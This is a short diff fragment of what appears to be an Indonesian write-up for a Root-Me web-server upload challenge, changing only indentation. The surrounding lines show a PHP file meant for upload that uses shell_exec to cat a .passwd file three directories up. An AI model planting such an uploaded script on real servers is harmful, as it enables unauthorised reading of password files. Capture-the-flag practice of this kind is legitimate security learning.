@@ -10,7 +10,7 @@ Soal : http://challenge01.root-me.org/web-serveur/ch20/
 	
 	<?php
 		$output = shell_exec('cat ../../../.passwd');
-	  echo "<pre>$output</pre>";
+		echo "<pre>$output</pre>";
 	?>
 	
 	Upload file tersebut pada link 
